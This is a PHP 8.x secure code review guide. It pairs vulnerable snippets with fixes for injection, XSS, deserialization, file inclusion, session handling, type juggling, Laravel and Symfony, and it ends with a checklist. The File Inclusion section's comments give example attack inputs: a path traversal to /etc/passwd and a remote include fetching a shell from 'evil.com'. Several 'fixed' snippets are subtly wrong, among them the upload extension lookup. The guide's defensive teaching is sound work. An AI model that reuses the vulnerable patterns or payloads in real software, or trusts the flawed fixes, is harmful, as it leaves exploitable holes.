# PHP Code Review Guide

> Review guide for PHP 8.x codebases covering SQL injection, XSS, deserialization, type safety, session management, framework-specific patterns (Laravel/Symfony), and dependency security.

## Table of Contents

- [SQL Injection](#sql-injection)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [Deserialization](#deserialization)
- [File Inclusion](#file-inclusion)
- [Session Management](#session-management)
- [Type Juggling](#type-juggling)
- [Command Injection](#command-injection)
- [Error Handling](#error-handling)
- [Authentication & Password Security](#authentication--password-security)
- [PHP 8.x Modern Features](#php-8x-modern-features)
- [Laravel-Specific Patterns](#laravel-specific-patterns)
- [Symfony-Specific Patterns](#symfony-specific-patterns)
- [Dependency Security](#dependency-security)
- [Performance](#performance)
- [Testing](#testing)
- [Review Checklist](#review-checklist)

---

## SQL Injection

### Prepared Statements vs Raw Queries

```php
// ❌ Direct string interpolation in SQL [blocking]
$id = $_GET['id'];
$result = mysqli_query($conn, "SELECT * FROM patients WHERE id = $id");

// ❌ mysql_* functions — deprecated and removed in PHP 7.0
$result = mysql_query("SELECT * FROM patients WHERE id = " . $_GET['id']);

// ❌ Quoting does not prevent injection
$name = mysqli_real_escape_string($conn, $_GET['name']);
$result = mysqli_query($conn, "SELECT * FROM patients WHERE name = '$name'");
// Still vulnerable to certain charset-based attacks

// ✅ PDO with prepared statements
$stmt = $pdo->prepare("SELECT * FROM patients WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]);
$patient = $stmt->fetch(PDO::FETCH_ASSOC);

// ✅ MySQLi with prepared statements
$stmt = $conn->prepare("SELECT * FROM patients WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
```

### Dynamic Query Building

```php
// ❌ Dynamic ORDER BY from user input [blocking]
$sort = $_GET['sort'];
$result = $pdo->query("SELECT * FROM patients ORDER BY $sort");

// ✅ Whitelist valid column names
$allowedColumns = ['name', 'date_of_birth', 'id', 'created_at'];
$sort = in_array($_GET['sort'], $allowedColumns, true) ? $_GET['sort'] : 'id';
$result = $pdo->query("SELECT * FROM patients ORDER BY $sort");

// ❌ Dynamic table name from user input
$table = $_GET['table'];
$pdo->query("SELECT * FROM $table");  // Table name cannot be parameterized

// ✅ Whitelist valid table names
$allowedTables = ['patients', 'appointments', 'medications'];
if (!in_array($_GET['table'], $allowedTables, true)) {
    throw new InvalidArgumentException('Invalid table');
}
```

### PDO Configuration

```php
// ❌ PDO without error mode — errors silently ignored [important]
$pdo = new PDO($dsn, $user, $pass);

// ❌ Emulated prepares — still vulnerable to certain injection [important]
$pdo = new PDO($dsn, $user, $pass);
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, true);

// ✅ Secure PDO configuration
$pdo = new PDO($dsn, $user, $pass, [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_EMULATE_PREPARES => false,  // Use real prepared statements
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::MYSQL_ATTR_MULTI_STATEMENTS => false,  // Prevent stacked queries
]);
```

---

## Cross-Site Scripting (XSS)

### Output Encoding

```php
// ❌ Unescaped output [blocking]
echo "Welcome, " . $_GET['name'];
echo "<p>" . $patient->notes . "</p>";

// ✅ htmlspecialchars with ENT_QUOTES and charset
echo "Welcome, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
echo "<p>" . htmlspecialchars($patient->notes, ENT_QUOTES, 'UTF-8') . "</p>";

// ✅ Create a helper function to reduce verbosity
function e(string $value): string {
    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}
echo "Welcome, " . e($_GET['name']);
```

### Template Engine Context

```php
// ❌ Raw output in Blade template [blocking]
// resources/views/patient.blade.php
<p>{!! $patient->notes !!}</p>  <!-- Raw, unescaped output -->

// ✅ Default Blade escaping (double curly braces)
<p>{{ $patient->notes }}</p>  <!-- Automatically calls htmlspecialchars -->

// ❌ Twig raw filter without justification
{{ patient.notes|raw }}

// ✅ Twig auto-escaping (enabled by default)
{{ patient.notes }}  <!-- Auto-escaped -->
```

### Content Security Policy

```php
// ❌ No CSP header — allows inline scripts [important]

// ✅ Set Content-Security-Policy header
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");

// ✅ In Laravel middleware
public function handle($request, Closure $next)
{
    $response = $next($request);
    $response->headers->set('Content-Security-Policy', "default-src 'self'");
    return $response;
}
```

---

## Deserialization

### unserialize() as RCE Vector

```php
// ❌ unserialize on user-controlled input — Remote Code Execution [blocking]
$data = unserialize($_COOKIE['user_prefs']);
$data = unserialize(base64_decode($_POST['data']));
$data = unserialize(file_get_contents('php://input'));

// ❌ allowed_classes does not fully mitigate — still dangerous
$data = unserialize($input, ['allowed_classes' => ['SafeClass']]);
// Destructor chains in standard library classes can still be exploited

// ✅ Use JSON for serialization — no code execution risk
$data = json_decode($_COOKIE['user_prefs'], true);
if (json_last_error() !== JSON_ERROR_NONE) {
    throw new InvalidArgumentException('Invalid data');
}

// ✅ If complex structures needed, use a serializer with explicit DTOs
$serializer = new Symfony\Component\Serializer\Serializer([...]);
$dto = $serializer->deserialize($json, PatientDTO::class, 'json');
```

### Session Deserialization

```php
// ❌ Custom session handler using unserialize [blocking]
class DbSessionHandler implements SessionHandlerInterface
{
    public function read($id): string
    {
        $row = $this->db->get($id);
        return unserialize($row['data']);  // Attacker controls session data
    }
}

// ✅ Use PHP's built-in session serialization (php_serialize handler)
// php.ini: session.serialize_handler = php_serialize
// Or use encrypted session drivers (Laravel's default)
```

---

## File Inclusion

### Local File Inclusion (LFI) and Remote File Inclusion (RFI)

```php
// ❌ User input in include/require — LFI/RFI [blocking]
$page = $_GET['page'];
include("pages/$page.php");
// Attacker: ?page=../../etc/passwd%00 (null byte, older PHP)
// Attacker: ?page=http://evil.com/shell (if allow_url_include=On)

// ❌ Insufficient sanitization
$page = str_replace('../', '', $_GET['page']);
// Bypassed with: ....// or ..%2f

// ✅ Whitelist allowed pages
$allowedPages = ['home', 'about', 'contact', 'patient-list'];
$page = $_GET['page'] ?? 'home';
if (!in_array($page, $allowedPages, true)) {
    http_response_code(404);
    exit('Page not found');
}
include("pages/{$page}.php");

// ✅ Use a router (framework-based) — never pass user input to include
// Laravel: Route::get('/{page}', [PageController::class, 'show']);
// Symfony: #[Route('/{page}', name: 'page_show')]
```

### File Upload Security

```php
// ❌ Trusting client-provided MIME type [blocking]
if ($_FILES['doc']['type'] === 'application/pdf') {
    move_uploaded_file($_FILES['doc']['tmp_name'], "uploads/" . $_FILES['doc']['name']);
}

// ✅ Validate using finfo (server-side MIME detection) + whitelist extension
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($_FILES['doc']['tmp_name']);
$allowedMimes = ['application/pdf', 'image/jpeg', 'image/png'];

if (!in_array($mime, $allowedMimes, true)) {
    throw new InvalidArgumentException('Invalid file type');
}

// Generate safe filename — never use client-provided name
$ext = array_search($mime, array_flip($allowedMimes), true) ?: 'bin';
$safeName = bin2hex(random_bytes(16)) . '.' . $ext;
$uploadDir = '/var/uploads/';  // Outside web root!
move_uploaded_file($_FILES['doc']['tmp_name'], $uploadDir . $safeName);
```

---

## Session Management

### Session Fixation

```php
// ❌ No session regeneration after login [blocking]
if (authenticate($username, $password)) {
    $_SESSION['user_id'] = $userId;
    $_SESSION['authenticated'] = true;
}

// ✅ Regenerate session ID after authentication
if (authenticate($username, $password)) {
    session_regenerate_id(true);  // true = delete old session
    $_SESSION['user_id'] = $userId;
    $_SESSION['authenticated'] = true;
}
```

### Session Configuration

```php
// ❌ Insecure session defaults [important]
session_start();

// ✅ Secure session configuration
ini_set('session.cookie_httponly', 1);     // Prevent JS access
ini_set('session.cookie_secure', 1);       // HTTPS only
ini_set('session.cookie_samesite', 'Lax'); // CSRF mitigation
ini_set('session.use_strict_mode', 1);     // Reject uninitialized session IDs
ini_set('session.use_only_cookies', 1);    // No session ID in URL
ini_set('session.cookie_lifetime', 0);     // Session cookie (browser close)
ini_set('session.gc_maxlifetime', 900);    // 15 min server-side expiry
session_start();

// ✅ In Laravel — config/session.php handles all of this
'secure' => true,
'http_only' => true,
'same_site' => 'lax',
'lifetime' => 15,  // minutes
```

---

## Type Juggling

### Loose Comparison (== vs ===)

```php
// ❌ Loose comparison — type juggling vulnerabilities [blocking]
if ($_POST['token'] == $storedToken) {  // "0e123" == "0e456" is TRUE!
    grantAccess();
}

// PHP type juggling examples:
// "0" == false     → true
// "" == null       → true
// "0e123" == "0"   → true (both are "zero in scientific notation")
// "1" == true      → true
// "php" == 0       → true (PHP < 8.0)

// ✅ Strict comparison — always use ===
if ($_POST['token'] === $storedToken) {
    grantAccess();
}

// ✅ For hash comparison, use timing-safe function
if (hash_equals($storedToken, $_POST['token'])) {
    grantAccess();
}
```

### switch Statement Gotcha

```php
// ❌ switch uses loose comparison [important]
switch ($_GET['action']) {
    case 0:       // Matches ANY non-numeric string in PHP < 8.0!
        doDefault();
        break;
    case 'admin':
        doAdmin();
        break;
}

// ✅ Use match expression (PHP 8.0+) — strict comparison
$result = match ($_GET['action']) {
    'admin' => doAdmin(),
    'user'  => doUser(),
    default => doDefault(),
};
```

### In Array Without Strict Flag

```php
// ❌ in_array without strict — type juggling [important]
$allowedRoles = ['admin', 'doctor', 'nurse'];
if (in_array(0, $allowedRoles)) {  // TRUE! 0 == "admin" in PHP < 8.0
    echo "Found";
}

// ✅ Always pass strict=true as third argument
if (in_array($role, $allowedRoles, true)) {
    echo "Found";
}
```

---

## Command Injection

### Shell Execution Functions

```php
// ❌ User input in shell commands [blocking]
$filename = $_GET['file'];
exec("cat /var/log/$filename", $output);
system("convert $filename output.png");
$result = shell_exec("grep '$search' /var/data/logs.txt");
$result = `ls $dir`;  // Backtick operator

// ✅ escapeshellarg for individual arguments
$filename = escapeshellarg($_GET['file']);
exec("cat /var/log/$filename", $output);

// ✅ escapeshellcmd for entire commands (less preferred)
$cmd = escapeshellcmd("convert " . $_GET['file'] . " output.png");

// ✅ Best: avoid shell entirely — use PHP native functions
$contents = file_get_contents("/var/log/" . basename($_GET['file']));
// Validate file is within allowed directory (see File Inclusion section)
```

### proc_open and passthru

```php
// ❌ passthru with user input [blocking]
passthru("ffmpeg -i " . $_FILES['video']['tmp_name'] . " output.mp4");

// ✅ Use proc_open with argument array (PHP 7.4+)
$process = proc_open(
    ['ffmpeg', '-i', $_FILES['video']['tmp_name'], 'output.mp4'],
    [1 => ['pipe', 'w'], 2 => ['pipe', 'w']],
    $pipes
);
```

---

## Error Handling

### Error Disclosure

```php
// ❌ display_errors in production — exposes internals [blocking]
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

// ❌ Printing exception details to user
try {
    $pdo->query($sql);
} catch (PDOException $e) {
    echo "Error: " . $e->getMessage();  // Reveals DB structure, query
}

// ✅ Production error configuration
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/var/log/php/error.log');
error_reporting(E_ALL);  // Still report everything — just log, don't display

// ✅ Generic error response, detailed logging
try {
    $pdo->query($sql);
} catch (PDOException $e) {
    error_log("DB error: " . $e->getMessage() . " | SQL: " . $sql);
    http_response_code(500);
    echo json_encode(['error' => 'Internal server error']);
}
```

### Exception Hierarchy

```php
// ❌ Catching generic Exception everywhere [important]
try {
    $patient = $this->repository->find($id);
} catch (\Exception $e) {
    return null;  // Swallows all errors including fatal ones
}

// ✅ Catch specific exceptions
try {
    $patient = $this->repository->find($id);
} catch (PatientNotFoundException $e) {
    return $this->json(['error' => 'Patient not found'], 404);
} catch (DatabaseConnectionException $e) {
    $this->logger->critical('DB connection lost', ['exception' => $e]);
    return $this->json(['error' => 'Service unavailable'], 503);
}
```

---

## Authentication & Password Security

### Password Hashing

```php
// ❌ MD5/SHA1 for passwords — trivially crackable [blocking]
$hash = md5($password);
$hash = sha1($password . $salt);

// ❌ Custom hashing scheme
$hash = hash('sha256', $salt . $password . $pepper);

// ✅ password_hash with PASSWORD_DEFAULT (currently bcrypt, auto-upgrades)
$hash = password_hash($password, PASSWORD_DEFAULT);

// ✅ Verification — constant-time comparison built-in
if (password_verify($inputPassword, $storedHash)) {
    // Login successful
}

// ✅ Check if rehash needed (algorithm/cost change)
if (password_needs_rehash($storedHash, PASSWORD_DEFAULT)) {
    $newHash = password_hash($inputPassword, PASSWORD_DEFAULT);
    $this->updateHash($userId, $newHash);
}
```

### CSRF Protection

```php
// ❌ No CSRF token on state-changing forms [blocking]
<form method="POST" action="/transfer">
    <input name="amount" value="1000">
    <button>Transfer</button>
</form>

// ✅ CSRF token generation and validation
// Generate (store in session)
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Include in form
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="<?= e($_SESSION['csrf_token']) ?>">
    <input name="amount" value="1000">
    <button>Transfer</button>
</form>

// Validate on submission
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
    http_response_code(403);
    exit('Invalid CSRF token');
}

// ✅ Laravel handles CSRF automatically via @csrf directive
<form method="POST" action="/transfer">
    @csrf
    ...
</form>
```

---

## PHP 8.x Modern Features

### Union Types and Named Arguments

```php
// ❌ PHPDoc-only type hints — not enforced [nit]
/**
 * @param string|int $id
 * @return Patient|null
 */
function findPatient($id) { ... }

// ✅ Native union types (PHP 8.0+)
function findPatient(string|int $id): ?Patient { ... }

// ✅ Named arguments for clarity (PHP 8.0+)
$patient = new Patient(
    name: 'Jan de Vries',
    dateOfBirth: new DateTime('1990-01-01'),
    bsn: '123456789',
);
```

### Match Expression

```php
// ❌ Verbose switch with repetitive break statements [nit]
switch ($status) {
    case 'active':
        $label = 'Active';
        break;
    case 'inactive':
        $label = 'Inactive';
        break;
    default:
        $label = 'Unknown';
        break;
}

// ✅ Match expression — strict comparison, returns value
$label = match ($status) {
    'active'   => 'Active',
    'inactive' => 'Inactive',
    default    => 'Unknown',
};
```

### Enums (PHP 8.1+)

```php
// ❌ String/int constants for finite sets [important]
class PatientStatus {
    const ACTIVE = 'active';
    const DISCHARGED = 'discharged';
    const DECEASED = 'deceased';
}
// Nothing prevents PatientStatus::ACTIVE = "invalid_value" elsewhere

// ✅ Backed enum — type-safe, serializable
enum PatientStatus: string {
    case Active = 'active';
    case Discharged = 'discharged';
    case Deceased = 'deceased';
}

// Usage
function discharge(Patient $patient, PatientStatus $status): void {
    // $status is guaranteed to be one of the three valid values
}
discharge($patient, PatientStatus::Discharged);
```

### Readonly Properties (PHP 8.1+) and Readonly Classes (PHP 8.2+)

```php
// ❌ Mutable DTO — can be accidentally modified after construction [nit]
class PatientDTO {
    public string $name;
    public string $bsn;
}

// ✅ Readonly properties — immutable after construction
class PatientDTO {
    public function __construct(
        public readonly string $name,
        public readonly string $bsn,
    ) {}
}

// ✅ Readonly class (PHP 8.2+) — all properties are readonly
readonly class PatientDTO {
    public function __construct(
        public string $name,
        public string $bsn,
    ) {}
}
```

---

## Laravel-Specific Patterns

### Mass Assignment

```php
// ❌ No $fillable or $guarded — mass assignment vulnerability [blocking]
class Patient extends Model {
    // All fields are mass-assignable!
}
Patient::create($request->all());  // Attacker adds is_admin=true

// ✅ Explicit $fillable whitelist
class Patient extends Model {
    protected $fillable = ['name', 'date_of_birth', 'email'];
}

// ✅ Even better — validate and extract specific fields
$validated = $request->validate([
    'name' => 'required|string|max:255',
    'date_of_birth' => 'required|date',
    'email' => 'required|email',
]);
Patient::create($validated);
```

### Eloquent N+1 Queries

```php
// ❌ N+1 query — each iteration triggers a query [important]
$patients = Patient::all();
foreach ($patients as $patient) {
    echo $patient->doctor->name;  // N additional queries
}

// ✅ Eager loading
$patients = Patient::with('doctor')->get();
foreach ($patients as $patient) {
    echo $patient->doctor->name;  // No additional queries
}

// ✅ Enable N+1 detection in development
// AppServiceProvider::boot()
Model::preventLazyLoading(!app()->isProduction());
```

### Middleware Authorization

```php
// ❌ Authorization in controller — easy to forget [important]
public function show(Patient $patient) {
    if (auth()->user()->cannot('view', $patient)) {
        abort(403);
    }
    return view('patient.show', compact('patient'));
}

// ✅ Policy-based authorization via middleware
// In route definition:
Route::get('/patients/{patient}', [PatientController::class, 'show'])
    ->middleware('can:view,patient');

// Or in controller constructor:
public function __construct() {
    $this->authorizeResource(Patient::class, 'patient');
}
```

---

## Symfony-Specific Patterns

### Service Configuration

```php
// ❌ Direct container access — service locator anti-pattern [important]
class PatientService {
    public function __construct(private ContainerInterface $container) {}

    public function process(): void {
        $repo = $this->container->get(PatientRepository::class);
    }
}

// ✅ Constructor injection
class PatientService {
    public function __construct(
        private readonly PatientRepository $repository,
        private readonly LoggerInterface $logger,
    ) {}
}
```

### Voter-Based Authorization

```php
// ❌ Role checks scattered in controllers [important]
#[Route('/admin/patients')]
public function list(): Response {
    if (!$this->isGranted('ROLE_ADMIN')) {
        throw new AccessDeniedException();
    }
}

// ✅ Use Voters for fine-grained access control
class PatientVoter extends Voter {
    protected function supports(string $attribute, mixed $subject): bool {
        return $subject instanceof Patient && in_array($attribute, ['VIEW', 'EDIT']);
    }

    protected function voteOnAttribute(string $attribute, mixed $subject, TokenInterface $token): bool {
        $user = $token->getUser();
        return match ($attribute) {
            'VIEW' => $this->canView($subject, $user),
            'EDIT' => $this->canEdit($subject, $user),
            default => false,
        };
    }
}
```

---

## Dependency Security

### Composer Audit

```php
// ❌ No dependency vulnerability scanning [important]
// composer.lock not checked for known vulnerabilities

// ✅ Run composer audit regularly
// $ composer audit
// Checks installed packages against known vulnerability databases

// ✅ In CI/CD pipeline
// composer audit --format=json --locked

// ✅ Pin dependencies and review updates
// composer.json — use exact or tightly bounded versions for production
"require": {
    "laravel/framework": "^11.0",
    "guzzlehttp/guzzle": "^7.8"
}
```

### Autoloader Security

```php
// ❌ include/require for class loading [important]
require_once 'lib/Patient.php';
require_once 'lib/Doctor.php';

// ✅ Composer PSR-4 autoloading — no manual includes needed
// composer.json
{
    "autoload": {
        "psr-4": {
            "App\\": "src/"
        }
    }
}
// $ composer dump-autoload --optimize
```

---

## Performance

### Database Query Optimization

```php
// ❌ Query inside loop [important]
foreach ($patientIds as $id) {
    $patient = Patient::find($id);  // N queries
    $results[] = $patient;
}

// ✅ Batch query
$patients = Patient::whereIn('id', $patientIds)->get();

// ❌ SELECT * when only specific fields needed [nit]
$patients = Patient::all();

// ✅ Select only needed columns
$patients = Patient::select(['id', 'name', 'email'])->get();
```

### Caching

```php
// ❌ Expensive computation on every request [nit]
public function getDashboardStats(): array {
    return [
        'total_patients' => Patient::count(),
        'active_today' => Patient::where('last_visit', today())->count(),
    ];
}

// ✅ Cache expensive queries
public function getDashboardStats(): array {
    return Cache::remember('dashboard_stats', 300, function () {
        return [
            'total_patients' => Patient::count(),
            'active_today' => Patient::where('last_visit', today())->count(),
        ];
    });
}
```

---

## Testing

### PHPUnit Best Practices

```php
// ❌ No assertions — test always passes [important]
public function testPatientCreation(): void {
    $patient = new Patient('Jan', '1990-01-01');
    // No assertion!
}

// ✅ Meaningful assertions with descriptive test names
public function test_patient_age_calculated_from_date_of_birth(): void {
    $patient = new Patient(
        name: 'Jan de Vries',
        dateOfBirth: new \DateTime('1990-01-01'),
    );

    $this->assertSame(36, $patient->getAge());
}

// ✅ Test exceptions
public function test_patient_rejects_future_date_of_birth(): void {
    $this->expectException(\InvalidArgumentException::class);
    $this->expectExceptionMessage('Date of birth cannot be in the future');

    new Patient(name: 'Jan', dateOfBirth: new \DateTime('+1 year'));
}

// ✅ Data providers for parameterized tests
#[DataProvider('invalidBsnProvider')]
public function test_bsn_validation_rejects_invalid_input(string $bsn): void {
    $this->assertFalse(BsnValidator::isValid($bsn));
}

public static function invalidBsnProvider(): array {
    return [
        'too short'  => ['12345678'],
        'too long'   => ['1234567890'],
        'non-numeric' => ['12345678a'],
        'empty'      => [''],
    ];
}
```

---

## Review Checklist

### SQL Injection (Severity: blocking)
- [ ] All queries use prepared statements (PDO or MySQLi)
- [ ] `PDO::ATTR_EMULATE_PREPARES` set to `false`
- [ ] Dynamic column/table names validated against whitelist
- [ ] No `mysql_*` functions (removed in PHP 7.0)

### XSS (Severity: blocking)
- [ ] All output escaped with `htmlspecialchars($v, ENT_QUOTES, 'UTF-8')`
- [ ] Template engine auto-escaping not bypassed (`{!! !!}`, `|raw`)
- [ ] Content-Security-Policy header set

### Deserialization (Severity: blocking)
- [ ] No `unserialize()` on user-controlled input
- [ ] JSON used instead of PHP serialization for data exchange

### File Inclusion (Severity: blocking)
- [ ] No user input in `include` / `require` statements
- [ ] File uploads validated server-side (finfo, not MIME from client)
- [ ] Uploaded files stored outside web root with generated names

### Session (Severity: blocking / important)
- [ ] `session_regenerate_id(true)` called after login
- [ ] Secure cookie flags set (httponly, secure, samesite)
- [ ] Session timeout appropriate for data sensitivity

### Type Safety (Severity: blocking / important)
- [ ] Strict comparison (`===`) used, especially for security checks
- [ ] `hash_equals()` used for token/hash comparison
- [ ] `in_array()` called with `strict: true`
- [ ] `match` preferred over `switch` for value mapping

### Command Injection (Severity: blocking)
- [ ] No user input in `exec()` / `system()` / `shell_exec()` / backticks
- [ ] `escapeshellarg()` used when shell execution is unavoidable
- [ ] PHP native functions preferred over shell commands

### Authentication (Severity: blocking)
- [ ] `password_hash()` / `password_verify()` used (not MD5/SHA)
- [ ] CSRF tokens on all state-changing forms
- [ ] Mass assignment protected (`$fillable` or validated input)

### Error Handling (Severity: important)
- [ ] `display_errors = 0` in production
- [ ] Exception details logged, not displayed to users
- [ ] Specific exceptions caught (not generic `\Exception`)

### Modern PHP (Severity: nit)
- [ ] PHP 8.1+ enums used for finite value sets
- [ ] Readonly properties/classes for immutable DTOs
- [ ] Union types and named arguments used where appropriate
- [ ] Composer autoloading (no manual `require`)

### Dependencies (Severity: important)
- [ ] `composer audit` clean (no known vulnerabilities)
- [ ] Dependencies pinned with bounded version constraints
